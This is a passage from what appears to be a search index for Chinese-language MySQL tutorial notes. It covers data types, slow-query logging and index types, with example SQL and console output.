30 \u4e2a\u5b57\u7b26\u3002 CHAR \u548c VARCHAR \u7c7b\u578b\u7c7b\u4f3c\uff0c\u4f46\u5b83\u4eec\u4fdd\u5b58\u548c\u68c0\u7d22\u7684\u65b9\u5f0f\u4e0d\u540c\u3002\u5b83\u4eec\u7684\u6700\u5927\u957f\u5ea6\u548c\u662f\u5426\u5c3e\u90e8\u7a7a\u683c\u88ab\u4fdd\u7559\u7b49\u65b9\u9762\u4e5f\u4e0d\u540c\u3002\u5728\u5b58\u50a8\u6216\u68c0\u7d22\u8fc7\u7a0b\u4e2d\u4e0d\u8fdb\u884c\u5927\u5c0f\u5199\u8f6c\u6362\u3002 BINARY \u548c VARBINARY \u7c7b\u4f3c\u4e8e CHAR \u548c VARCHAR\uff0c\u4e0d\u540c\u7684\u662f\u5b83\u4eec\u5305\u542b\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u800c\u4e0d\u8981\u975e\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u4eec\u5305\u542b\u5b57\u8282\u5b57\u7b26\u4e32\u800c\u4e0d\u662f\u5b57\u7b26\u5b57\u7b26\u4e32\u3002\u8fd9\u8bf4\u660e\u5b83\u4eec\u6ca1\u6709\u5b57\u7b26\u96c6\uff0c\u5e76\u4e14\u6392\u5e8f\u548c\u6bd4\u8f83\u57fa\u4e8e\u5217\u503c\u5b57\u8282\u7684\u6570\u503c\u503c\u3002 BLOB \u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5927\u5bf9\u8c61\uff0c\u53ef\u4ee5\u5bb9\u7eb3\u53ef\u53d8\u6570\u91cf\u7684\u6570\u636e\u3002\u6709 4 \u79cd BLOB \u7c7b\u578b\uff1aTINYBLOB\u3001BLOB\u3001MEDIUMBLOB \u548c LONGBLOB\u3002\u5b83\u4eec\u533a\u522b\u5728\u4e8e\u53ef\u5bb9\u7eb3\u5b58\u50a8\u8303\u56f4\u4e0d\u540c\u3002 \u6709 4 \u79cd TEXT \u7c7b\u578b\uff1aTINYTEXT\u3001TEXT\u3001MEDIUMTEXT \u548c LONGTEXT\u3002\u5bf9\u5e94\u7684\u8fd9 4 \u79cd BLOB \u7c7b\u578b\uff0c\u53ef\u5b58\u50a8\u7684\u6700\u5927\u957f\u5ea6\u4e0d\u540c\uff0c\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u9009\u62e9\u3002 \u6ce8\u610f\uff1a\u5bf9\u4e8echar\u578b\uff0c\u5b58\u50a8\u65f6\uff0c\u5982\u679c\u957f\u5ea6\u4e0d\u591f\uff0c\u5728\u5b57\u7b26\u4e32\u540e\u9762\u8865\u7a7a\u683c\uff1b\u4f46\u662f\u67e5\u8be2\u65f6\uff0c\u4f1a\u81ea\u52a8\u5c06\u5b57\u7b26\u4e32\u53f3\u4fa7\u7684\u7a7a\u683c\u8131\u6389\u3002 mysql> create table str (name char(10),name2 varchar(10)); mysql> insert into str values('abcdefg','abcdefg'); mysql> select * from str; +---------+---------+ | name | name2 | +---------+---------+ | abcdefg | abcdefg | +---------+---------+ 1 row in set (0.00 sec) mysql> insert into str values('abcd ','abcd '); mysql> select concat('(',name,')'),concat('(',name2,')') from str; +----------------------+-----------------------+ | concat('(',name,')') | concat('(',name2,')') | +----------------------+-----------------------+ | (abcdefg) | (abcdefg) | | (abcd) | (abcd ) | +----------------------+-----------------------+ 2 rows in set (0.00 sec) enum\uff1a\u679a\u4e3e\u7c7b\u578b \u63d2\u5165\u591a\u4e2a\u7ed9\u5b9a\u7684\u503c\u4e2d\u7684\u4e00\u4e2a\u503c set\uff1a\u96c6\u5408\u7c7b\u578b \u63d2\u5165\u591a\u4e2a\u7ed9\u5b9a\u7684\u503c\u4e2d\u7684\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u503c mysql> create table es (sex enum('male','female'),os set('Linux','AIX','HP-UX','Centos')); mysql> insert into es values('male','Linux,HP-UX'); \u5bf9\u4e8e\u679a\u4e3e\u7c7b\u578b\uff0c\u53ef\u4ee5\u4f7f\u7528\u503c\u7684\u7f16\u53f7\u5411\u8868\u4e2d\u63d2\u5165\u6570\u636e mysql> insert into es(sex) values(2); Query OK, 1 row affected (0.02 sec) mysql> select * from es; +--------+-------------+ | sex | os | +--------+-------------+ | male | Linux,HP-UX | | female | NULL | +--------+-------------+ 2 rows in set (0.00 sec) mysql 5.5\u91cc\uff0c\u5141\u8bb8\u5411\u8868\u4e2d\u63d2\u5165\u672a\u5b9a\u4e49\u7684\u503c\uff1b\u4f46\u662f\u5728mysql 5.6\u7248\u672c\u4e2d\u662f\u4e0d\u5141\u8bb8\u8fd9\u6837\u64cd\u4f5c\u7684\u3002","title":"\u6570\u636e\u7c7b\u578b"},{"location":"database/mysql/type/#mysql","text":"MySQL \u4e2d\u5b9a\u4e49\u6570\u636e\u5b57\u6bb5\u7684\u7c7b\u578b\u5bf9\u4f60\u6570\u636e\u5e93\u7684\u4f18\u5316\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002 MySQL \u652f\u6301\u591a\u79cd\u7c7b\u578b\uff0c\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b\uff1a\u6570\u503c\u3001\u65e5\u671f/\u65f6\u95f4\u548c\u5b57\u7b26\u4e32(\u5b57\u7b26)\u7c7b\u578b\u3002","title":"MySQL \u6570\u636e\u7c7b\u578b"},{"location":"database/mysql/type/#_1","text":"MySQL \u652f\u6301\u6240\u6709\u6807\u51c6 SQL \u6570\u503c\u6570\u636e\u7c7b\u578b\u3002 \u8fd9\u4e9b\u7c7b\u578b\u5305\u62ec\u4e25\u683c\u6570\u503c\u6570\u636e\u7c7b\u578b(INTEGER\u3001SMALLINT\u3001DECIMAL \u548c NUMERIC)\uff0c\u4ee5\u53ca\u8fd1\u4f3c\u6570\u503c\u6570\u636e\u7c7b\u578b(FLOAT\u3001REAL \u548c DOUBLE PRECISION)\u3002 \u5173\u952e\u5b57INT\u662fINTEGER\u7684\u540c\u4e49\u8bcd\uff0c\u5173\u952e\u5b57DEC\u662fDECIMAL\u7684\u540c\u4e49\u8bcd\u3002 BIT\u6570\u636e\u7c7b\u578b\u4fdd\u5b58\u4f4d\u5b57\u6bb5\u503c\uff0c\u5e76\u4e14\u652f\u6301 MyISAM\u3001MEMORY\u3001InnoDB \u548c BDB\u8868\u3002 \u4f5c\u4e3a SQL \u6807\u51c6\u7684\u6269\u5c55\uff0cMySQL \u4e5f\u652f\u6301\u6574\u6570\u7c7b\u578b TINYINT\u3001MEDIUMINT \u548c BIGINT\u3002\u4e0b\u9762\u7684\u8868\u663e\u793a\u4e86\u9700\u8981\u7684\u6bcf\u4e2a\u6574\u6570\u7c7b\u578b\u7684\u5b58\u50a8\u548c\u8303\u56f4\u3002 \u7c7b\u578b \u5927\u5c0f \u8303\u56f4\uff08\u6709\u7b26\u53f7\uff09 \u8303\u56f4\uff08\u65e0\u7b26\u53f7\uff09 \u7528\u9014 TINYINT 1 Bytes (-128\uff0c127) (0\uff0c255) \u5c0f\u6574\u6570\u503c SMALLINT 2 Bytes (-32 768\uff0c32 767) (0\uff0c65 535) \u5927\u6574\u6570\u503c MEDIUMINT 3 Bytes (-8 388 608\uff0c8 388 607) (0\uff0c16 777 215) \u5927\u6574\u6570\u503c INT\u6216INTEGER 4 Bytes (-2 147 483 648\uff0c2 147 483 647) (0\uff0c4 294 967 295) \u5927\u6574\u6570\u503c BIGINT 8 Bytes (-9,223,372,036,854,775,808\uff0c9 223 372 036 854 775 807) (0\uff0c18 446 744 073 709 551 615) \u6781\u5927\u6574\u6570\u503c FLOAT 4 Bytes (-3.402 823 466 E+38\uff0c-1.175 494 351 E-38)\uff0c0\uff0c(1.175 494 351 E-38\uff0c3.402 823 466 351 E+38) 0\uff0c(1.175 494 351 E-38\uff0c3.402 823 466 E+38) \u5355\u7cbe\u5ea6 \u6d6e\u70b9\u6570\u503c DOUBLE 8 Bytes (-1.797 693 134 862 315 7 E+308\uff0c-2.225 073 858 507 201 4 E-308)\uff0c0\uff0c(2.225 073 858 507 201 4 E-308\uff0c1.797 693 134 862 315 7 E+308) 0\uff0c(2.225 073 858 507 201 4 E-308\uff0c1.797 693 134 862 315 7 E+308) \u53cc\u7cbe\u5ea6 \u6d6e\u70b9\u6570\u503c DECIMAL \u5bf9DECIMAL(M,D) \uff0c\u5982\u679cM>D\uff0c\u4e3aM+2\u5426\u5219\u4e3aD+2 \u4f9d\u8d56\u4e8eM\u548cD\u7684\u503c \u4f9d\u8d56\u4e8eM\u548cD\u7684\u503c \u5c0f\u6570\u503c","title":"\u6570\u503c\u7c7b\u578b"},{"location":"database/mysql/type/#_2","text":"\u6574\u578b\u4e5f\u53ef\u4ee5\u6307\u5b9a\u663e\u793a\u5bbd\u5ea6\u7684\uff0c\u4f46\u662f\u5e76\u4e0d\u5f71\u54cd\u53d6\u503c\u8303\u56f4\u7684\u3002 [root@mysql mysql]# mysql -u root -predhat mysql> use up; mysql> create table table1 ( -> tiny tinyint, -> small smallint, -> medium mediumint, -> nint int, -> big bigint, -> fl float(6,3), -> df double(6,3) -> ); mysql> desc table1; +--------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +--------+--------------+------+-----+---------+-------+ | tiny | tinyint(4) | YES | | NULL | | | small | smallint(6) | YES | | NULL | | | medium | mediumint(9) | YES | | NULL | | | nint | int(11) | YES | | NULL | | | big | bigint(20) | YES | | NULL | | | fl | float(6,3) | YES | | NULL | | | df | double(6,3) | YES | | NULL | | +--------+--------------+------+-----+---------+-------+ 7 rows in set (0.01 sec) mysql> insert into table1 values(123456789,123456789,123456789,123456789,123456789,1234.56789,1234.56789); Query OK, 1 row affected, 5 warnings (0.02 sec) mysql> show warnings -> ; +---------+------+-------------------------------------------------+ | Level | Code | Message | +---------+------+-------------------------------------------------+ | Warning | 1264 | Out of range value for column 'tiny' at row 1 | | Warning | 1264 | Out of range value for column 'small' at row 1 | | Warning | 1264 | Out of range value for column 'medium' at row 1 | | Warning | 1264 | Out of range value for column 'fl' at row 1 | | Warning | 1264 | Out of range value for column 'df' at row 1 | +---------+------+-------------------------------------------------+ 5 rows in set (0.00 sec) mysql> select * from table1; +------+-------+---------+-----------+-----------+---------+---------+ | tiny | small | medium | nint | big | fl | df | +------+-------+---------+-----------+-----------+---------+---------+ | 127 | 32767 | 8388607 | 123456789 | 123456789 | 999.999 | 999.999 | +------+-------+---------+-----------+-----------+---------+---------+ 1 row in set (0.00 sec) \u8d85\u51fa\u6570\u636e\u7c7b\u578b\u80fd\u591f\u8868\u793a\u7684\u8303\u56f4\uff0c\u9ed8\u8ba4\u63d2\u5165\u8be5\u7c7b\u578b\u7684\u6700\u5927\u503c\u3002 \u65e0\u7b26\u53f7\u6570\u4e3e\u4f8b unsigned mysql> create table table2 (tiny tinyint unsigned); mysql> desc table2; +-------+---------------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+---------------------+------+-----+---------+-------+ | tiny | tinyint(3) unsigned | YES | | NULL | | +-------+---------------------+------+-----+---------+-------+ 1 row in set (0.00 sec) mysql> insert into table2 values(128),(256); mysql> show warnings; +---------+------+-----------------------------------------------+ | Level | Code | Message | +---------+------+-----------------------------------------------+ | Warning | 1264 | Out of range value for column 'tiny' at row 2 | +---------+------+-----------------------------------------------+ 1 row in set (0.00 sec) mysql> select * from table2; +------+ | tiny | +------+ | 128 | | 255 | +------+ 2 rows in set (0.00 sec) zerofill\uff1a\u96f6\u586b\u5145 \uff0c\u663e\u793a\u5bbd\u5ea6\u4e0d\u8db3\u65f6\uff0c\u88650 mysql> create table zf (id tinyint zerofill); mysql> desc zf; +-------+------------------------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+------------------------------+------+-----+---------+-------+ | id | tinyint(3) unsigned zerofill | YES | | NULL | | +-------+------------------------------+------+-----+---------+-------+ 1 row in set (0.00 sec) mysql> insert into zf values(1),(11),(111); mysql> select * from zf; +------+ | id | +------+ | 001 | | 011 | | 111 | +------+ 3 rows in set (0.00 sec)","title":""},{"location":"database/mysql/type/#_3","text":"\u8868\u793a\u65f6\u95f4\u503c\u7684\u65e5\u671f\u548c\u65f6\u95f4\u7c7b\u578b\u4e3aDATETIME\u3001DATE\u3001TIMESTAMP\u3001TIME\u548cYEAR\u3002 \u6bcf\u4e2a\u65f6\u95f4\u7c7b\u578b\u6709\u4e00\u4e2a\u6709\u6548\u503c\u8303\u56f4\u548c\u4e00\u4e2a\"\u96f6\"\u503c\uff0c\u5f53\u6307\u5b9a\u4e0d\u5408\u6cd5\u7684MySQL\u4e0d\u80fd\u8868\u793a\u7684\u503c\u65f6\u4f7f\u7528\"\u96f6\"\u503c\u3002 TIMESTAMP\u7c7b\u578b\u6709\u4e13\u6709\u7684\u81ea\u52a8\u66f4\u65b0\u7279\u6027\uff0c\u5c06\u5728\u540e\u9762\u63cf\u8ff0\u3002 \u7c7b\u578b \u5927\u5c0f ( bytes) \u8303\u56f4 \u683c\u5f0f \u7528\u9014 DATE 3 1000-01-01/9999-12-31 YYYY-MM-DD \u65e5\u671f\u503c TIME 3 '-838:59:59'/'838:59:59' HH:MM:SS \u65f6\u95f4\u503c\u6216\u6301\u7eed\u65f6\u95f4 YEAR 1 1901/2155 YYYY \u5e74\u4efd\u503c DATETIME 8 1000-01-01 00:00:00/9999-12-31 23:59:59 YYYY-MM-DD HH:MM:SS \u6df7\u5408\u65e5\u671f\u548c\u65f6\u95f4\u503c TIMESTAMP 4 1970-01-01 00:00:00/2038\u7ed3\u675f\u65f6\u95f4\u662f\u7b2c 2147483647 \u79d2\uff0c\u5317\u4eac\u65f6\u95f4 2038-1-19 11:14:07 \uff0c\u683c\u6797\u5c3c\u6cbb\u65f6\u95f4 2038\u5e741\u670819\u65e5 \u51cc\u6668 03:14:07 YYYYMMDD HHMMSS \u6df7\u5408\u65e5\u671f\u548c\u65f6\u95f4\u503c\uff0c\u65f6\u95f4\u6233 mysql> create table ttime (ttime time,tdate date,tdt datetime,tts timestamp,ty year); mysql> insert into ttime values(curtime(),curdate(),now(),now(),year(now())); mysql> select * from ttime; +----------+------------+---------------------+---------------------+------+ | ttime | tdate | tdt | tts | ty | +----------+------------+---------------------+---------------------+------+ | 11:20:48 | 2015-09-11 | 2015-09-11 11:20:48 | 2015-09-11 11:20:48 | 2015 | +----------+------------+---------------------+---------------------+------+ 1 row in set (0.00 sec) mysql> insert into ttime values('11:22:33','2015-09-11','2015-09-11 11:22:36','2015-09-11 11:22:56','2048'); mysql> insert into ttime values('11:22:33','2015-09-11','2015-09-11 11:22:36','2015-09-11 11:22:56','66'); mysql> select * from ttime; +----------+------------+---------------------+---------------------+------+ | ttime | tdate | tdt | tts | ty | +----------+------------+---------------------+---------------------+------+ | 11:20:48 | 2015-09-11 | 2015-09-11 11:20:48 | 2015-09-11 11:20:48 | 2015 | | 11:22:33 | 2015-09-11 | 2015-09-11 11:22:36 | 2015-09-11 11:22:56 | 2048 | | 11:22:33 | 2015-09-11 | 2015-09-11 11:22:36 | 2015-09-11 11:22:56 | 2066 | +----------+------------+---------------------+---------------------+------+ 3 rows in set (0.00 sec)","title":"\u65e5\u671f\u548c\u65f6\u95f4\u7c7b\u578b"},{"location":"database/mysql/type/#_4","text":"\u5b57\u7b26\u4e32\u7c7b\u578b\u6307CHAR\u3001VARCHAR\u3001BINARY\u3001VARBINARY\u3001BLOB\u3001TEXT\u3001ENUM\u548cSET\u3002\u8be5\u8282\u63cf\u8ff0\u4e86\u8fd9\u4e9b\u7c7b\u578b\u5982\u4f55\u5de5\u4f5c\u4ee5\u53ca\u5982\u4f55\u5728\u67e5\u8be2\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u7c7b\u578b\u3002 \u7c7b\u578b \u5927\u5c0f \u7528\u9014 CHAR 0-255 bytes \u5b9a\u957f\u5b57\u7b26\u4e32 VARCHAR 0-65535 bytes \u53d8\u957f\u5b57\u7b26\u4e32 TINYBLOB 0-255 bytes \u4e0d\u8d85\u8fc7 255 \u4e2a\u5b57\u7b26\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 TINYTEXT 0-255 bytes \u77ed\u6587\u672c\u5b57\u7b26\u4e32 BLOB 0-65 535 bytes \u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u957f\u6587\u672c\u6570\u636e TEXT 0-65 535 bytes \u957f\u6587\u672c\u6570\u636e MEDIUMBLOB 0-16 777 215 bytes \u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u4e2d\u7b49\u957f\u5ea6\u6587\u672c\u6570\u636e MEDIUMTEXT 0-16 777 215 bytes \u4e2d\u7b49\u957f\u5ea6\u6587\u672c\u6570\u636e LONGBLOB 0-4 294 967 295 bytes \u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u6781\u5927\u6587\u672c\u6570\u636e LONGTEXT 0-4 294 967 295 bytes \u6781\u5927\u6587\u672c\u6570\u636e \u6ce8\u610f \uff1achar(n) \u548c varchar(n) \u4e2d\u62ec\u53f7\u4e2d n \u4ee3\u8868\u5b57\u7b26\u7684\u4e2a\u6570\uff0c\u5e76\u4e0d\u4ee3\u8868\u5b57\u8282\u4e2a\u6570\uff0c\u6bd4\u5982 CHAR(30) \u5c31\u53ef\u4ee5\u5b58\u50a8 30 \u4e2a\u5b57\u7b26\u3002 CHAR \u548c VARCHAR \u7c7b\u578b\u7c7b\u4f3c\uff0c\u4f46\u5b83\u4eec\u4fdd\u5b58\u548c\u68c0\u7d22\u7684\u65b9\u5f0f\u4e0d\u540c\u3002\u5b83\u4eec\u7684\u6700\u5927\u957f\u5ea6\u548c\u662f\u5426\u5c3e\u90e8\u7a7a\u683c\u88ab\u4fdd\u7559\u7b49\u65b9\u9762\u4e5f\u4e0d\u540c\u3002\u5728\u5b58\u50a8\u6216\u68c0\u7d22\u8fc7\u7a0b\u4e2d\u4e0d\u8fdb\u884c\u5927\u5c0f\u5199\u8f6c\u6362\u3002 BINARY \u548c VARBINARY \u7c7b\u4f3c\u4e8e CHAR \u548c VARCHAR\uff0c\u4e0d\u540c\u7684\u662f\u5b83\u4eec\u5305\u542b\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u800c\u4e0d\u8981\u975e\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u4eec\u5305\u542b\u5b57\u8282\u5b57\u7b26\u4e32\u800c\u4e0d\u662f\u5b57\u7b26\u5b57\u7b26\u4e32\u3002\u8fd9\u8bf4\u660e\u5b83\u4eec\u6ca1\u6709\u5b57\u7b26\u96c6\uff0c\u5e76\u4e14\u6392\u5e8f\u548c\u6bd4\u8f83\u57fa\u4e8e\u5217\u503c\u5b57\u8282\u7684\u6570\u503c\u503c\u3002 BLOB \u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5927\u5bf9\u8c61\uff0c\u53ef\u4ee5\u5bb9\u7eb3\u53ef\u53d8\u6570\u91cf\u7684\u6570\u636e\u3002\u6709 4 \u79cd BLOB \u7c7b\u578b\uff1aTINYBLOB\u3001BLOB\u3001MEDIUMBLOB \u548c LONGBLOB\u3002\u5b83\u4eec\u533a\u522b\u5728\u4e8e\u53ef\u5bb9\u7eb3\u5b58\u50a8\u8303\u56f4\u4e0d\u540c\u3002 \u6709 4 \u79cd TEXT \u7c7b\u578b\uff1aTINYTEXT\u3001TEXT\u3001MEDIUMTEXT \u548c LONGTEXT\u3002\u5bf9\u5e94\u7684\u8fd9 4 \u79cd BLOB \u7c7b\u578b\uff0c\u53ef\u5b58\u50a8\u7684\u6700\u5927\u957f\u5ea6\u4e0d\u540c\uff0c\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u9009\u62e9\u3002 \u6ce8\u610f\uff1a\u5bf9\u4e8echar\u578b\uff0c\u5b58\u50a8\u65f6\uff0c\u5982\u679c\u957f\u5ea6\u4e0d\u591f\uff0c\u5728\u5b57\u7b26\u4e32\u540e\u9762\u8865\u7a7a\u683c\uff1b\u4f46\u662f\u67e5\u8be2\u65f6\uff0c\u4f1a\u81ea\u52a8\u5c06\u5b57\u7b26\u4e32\u53f3\u4fa7\u7684\u7a7a\u683c\u8131\u6389\u3002 mysql> create table str (name char(10),name2 varchar(10)); mysql> insert into str values('abcdefg','abcdefg'); mysql> select * from str; +---------+---------+ | name | name2 | +---------+---------+ | abcdefg | abcdefg | +---------+---------+ 1 row in set (0.00 sec) mysql> insert into str values('abcd ','abcd '); mysql> select concat('(',name,')'),concat('(',name2,')') from str; +----------------------+-----------------------+ | concat('(',name,')') | concat('(',name2,')') | +----------------------+-----------------------+ | (abcdefg) | (abcdefg) | | (abcd) | (abcd ) | +----------------------+-----------------------+ 2 rows in set (0.00 sec) enum\uff1a\u679a\u4e3e\u7c7b\u578b \u63d2\u5165\u591a\u4e2a\u7ed9\u5b9a\u7684\u503c\u4e2d\u7684\u4e00\u4e2a\u503c set\uff1a\u96c6\u5408\u7c7b\u578b \u63d2\u5165\u591a\u4e2a\u7ed9\u5b9a\u7684\u503c\u4e2d\u7684\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u503c mysql> create table es (sex enum('male','female'),os set('Linux','AIX','HP-UX','Centos')); mysql> insert into es values('male','Linux,HP-UX'); \u5bf9\u4e8e\u679a\u4e3e\u7c7b\u578b\uff0c\u53ef\u4ee5\u4f7f\u7528\u503c\u7684\u7f16\u53f7\u5411\u8868\u4e2d\u63d2\u5165\u6570\u636e mysql> insert into es(sex) values(2); Query OK, 1 row affected (0.02 sec) mysql> select * from es; +--------+-------------+ | sex | os | +--------+-------------+ | male | Linux,HP-UX | | female | NULL | +--------+-------------+ 2 rows in set (0.00 sec) mysql 5.5\u91cc\uff0c\u5141\u8bb8\u5411\u8868\u4e2d\u63d2\u5165\u672a\u5b9a\u4e49\u7684\u503c\uff1b\u4f46\u662f\u5728mysql 5.6\u7248\u672c\u4e2d\u662f\u4e0d\u5141\u8bb8\u8fd9\u6837\u64cd\u4f5c\u7684\u3002","title":"\u5b57\u7b26\u4e32\u7c7b\u578b"},{"location":"database/mysql/%E6%85%A2sql/","text":"\u5728 MySQL \u4e2d\u67e5\u8be2 SQL \u7684\u6267\u884c\u8bb0\u5f55\u901a\u5e38\u6d89\u53ca\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a \u6162\u67e5\u8be2\u65e5\u5fd7 \uff1aMySQL \u63d0\u4f9b\u4e86\u6162\u67e5\u8be2\u65e5\u5fd7\u529f\u80fd\uff0c\u5b83\u8bb0\u5f55\u6267\u884c\u65f6\u95f4\u8d85\u8fc7\u67d0\u4e2a\u9608\u503c\u7684\u6240\u6709 SQL \u67e5\u8be2\u3002\u9996\u5148\u786e\u4fdd\u6162\u67e5\u8be2\u65e5\u5fd7\u5df2\u7ecf\u88ab\u542f\u7528\uff0c\u5e76\u8bbe\u7f6e\u4e86\u5408\u9002\u7684\u9608\u503c\u3002 SHOW VARIABLES LIKE 'slow_query_log'; SHOW VARIABLES LIKE 'long_query_time'; \u5982\u679c\u6162\u67e5\u8be2\u65e5\u5fd7\u672a\u542f\u7528\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u542f\u7528\uff1a SET GLOBAL slow_query_log = 'ON'; \u5e76\u8bbe\u7f6e\u4e00\u4e2a\u9002\u5f53\u7684\u65f6\u95f4\u9608\u503c\uff1a SET GLOBAL long_query_time = [\u79d2\u6570]; \u67e5\u8be2\u65e5\u5fd7\u6587\u4ef6 \uff1a\u6162\u67e5\u8be2\u65e5\u5fd7\u88ab\u5199\u5165\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u4f60\u53ef\u4ee5\u67e5\u770b\u8fd9\u4e2a\u6587\u4ef6\u6765\u83b7\u53d6\u6267\u884c\u8bb0\u5f55\u3002\u6587\u4ef6\u4f4d\u7f6e\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u627e\u5230\uff1a SHOW VARIABLES LIKE 'slow_query_log_file'; \u65e5\u5fd7\u5206\u6790\u5de5\u5177 \uff1a\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u65e5\u5fd7\u5206\u6790\u5de5\u5177\uff0c\u5982 mysqldumpslow \uff0c\u6765\u89e3\u6790\u6162\u67e5\u8be2\u65e5\u5fd7\uff0c\u5e76\u5f97\u5230\u66f4\u6613\u4e8e\u7406\u89e3\u7684\u62a5\u544a\u3002 \u5e38\u89c4\u67e5\u8be2\u65e5\u5fd7 \uff1a\u9664\u4e86\u6162\u67e5\u8be2\u65e5\u5fd7\uff0cMySQL \u8fd8\u6709\u4e00\u4e2a\u5e38\u89c4\u67e5\u8be2\u65e5\u5fd7\uff0c\u8bb0\u5f55\u6240\u6709\u7684 SQL \u8bed\u53e5\u3002\u8fd9\u4e2a\u529f\u80fd\u9ed8\u8ba4\u662f\u5173\u95ed\u7684\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u4f1a\u663e\u8457\u5f71\u54cd\u6027\u80fd\u3002\u5982\u679c\u9700\u8981\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e general_log \u548c general_log_file \u53d8\u91cf\u6765\u542f\u7528\u3002 \u6027\u80fd\u6a21\u5f0f \uff1aMySQL 5.6 \u53ca\u66f4\u9ad8\u7248\u672c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6027\u80fd\u6a21\u5f0f\uff08Performance Schema\uff09\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u76d1\u63a7\u670d\u52a1\u5668\u7684\u8fd0\u884c\u60c5\u51b5\uff0c\u5305\u62ec SQL \u6267\u884c\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 \u8bf7\u6ce8\u610f\uff0c\u9891\u7e41\u67e5\u8be2\u8fd9\u4e9b\u65e5\u5fd7\u6216\u542f\u7528\u67d0\u4e9b\u65e5\u5fd7\u8bb0\u5f55\u7279\u6027\u53ef\u80fd\u4f1a\u5bf9\u6570\u636e\u5e93\u6027\u80fd\u4ea7\u751f\u5f71\u54cd\uff0c\u56e0\u6b64\u5efa\u8bae\u4ec5\u5728\u5fc5\u8981\u65f6\u4f7f\u7528\uff0c\u5e76\u5728\u4f7f\u7528\u540e\u53ca\u65f6\u5173\u95ed\u3002","title":"\u6162sql"},{"location":"database/mysql/%E7%B4%A2%E5%BC%95/","text":"MySQL\u652f\u6301\u591a\u79cd\u7d22\u5f15\u7c7b\u578b\uff0c\u6bcf\u79cd\u7c7b\u578b\u90fd\u6709\u5176\u7279\u5b9a\u7528\u9014\u548c\u4f18\u5316\u573a\u666f\u3002\u4e0b\u9762\u662fMySQL\u4e2d\u5e38\u89c1\u7684\u51e0\u79cd\u7d22\u5f15\u7c7b\u578b\uff1a 1.B-Tree\u7d22\u5f15\uff1a \u6700\u5e38\u89c1\u7684\u7d22\u5f15\u7c7b\u578b\uff0c\u9002\u7528\u4e8e\u5168\u503c\u5339\u914d\u3001\u503c\u8303\u56f4\u6216\u524d\u7f00\u67e5\u627e\u3002 \u5728\u7b49\u4e8e\u3001\u5927\u4e8e\u3001\u5c0f\u4e8e\u3001BETWEEN\u3001IN\u7b49\u67e5\u8be2\u4e2d\u6548\u679c\u6700\u4f73\u3002 \u5bf9\u4e8e\u5b57\u7b26\u4e32\u5b57\u6bb5\uff0c\u53ef\u4ee5\u4f18\u5316LIKE\u67e5\u8be2\uff0c\u4f46\u4ec5\u5f53\u6a21\u5f0f\u7684\u5f00\u59cb\u90e8\u5206\u4e0d\u662f\u901a\u914d\u7b26\u65f6\u3002 ALTER TABLE table_name ADD INDEX index_name (column_name); \u6216\u8005 CREATE INDEX index_name ON table_name (column_name); 2.\u54c8\u5e0c\u7d22\u5f15\uff1a \u57fa\u4e8e\u54c8\u5e0c\u8868\u5b9e\u73b0\uff0c\u53ea\u6709\u7cbe\u786e\u5339\u914d\u7d22\u5f15\u5217\u7684\u67e5\u8be2\u624d\u6709\u6548\u3002 \u975e\u5e38\u5feb\u7684\u67e5\u627e\u901f\u5ea6\uff0c\u4f46\u4e0d\u652f\u6301\u6392\u5e8f\u548c\u90e8\u5206\u67e5\u627e\u3002 \u901a\u5e38\u5728\u5185\u5b58\u6570\u636e\u5e93\uff08\u4f8b\u5982MySQL\u7684MEMORY\u8868\u7c7b\u578b\uff09\u4e2d\u4f7f\u7528\u3002 CREATE TABLE table_name ( column_name column_type, INDEX USING HASH (column_name) ); 3.\u5168\u6587\u7d22\u5f15\uff08Full-text Indexes\uff09\uff1a \u4e13\u95e8\u7528\u4e8e\u5168\u6587\u641c\u7d22\u3002 \u53ea\u80fd\u5728CHAR\u3001VARCHAR\u6216TEXT\u7c7b\u578b\u7684\u5217\u4e0a\u521b\u5efa\u3002 \u4f7f\u7528\u5168\u6587\u7d22\u5f15\u53ef\u4ee5\u5728\u5305\u542b\u5927\u91cf\u6587\u672c\u7684\u5b57\u6bb5\u4e0a\u8fdb\u884c\u6709\u6548\u7684\u641c\u7d22\u3002 ALTER TABLE table_name ADD FULLTEXT index_name (column_name); \u6216\u8005 CREATE FULLTEXT INDEX index_name ON table_name (column_name); 4.\u7a7a\u95f4\u7d22\u5f15\uff08Spatial Indexes\uff09\uff1a \u7528\u4e8e\u7a7a\u95f4\u6570\u636e\u7c7b\u578b\uff0c\u5982\u51e0\u4f55\u6570\u636e\u3002 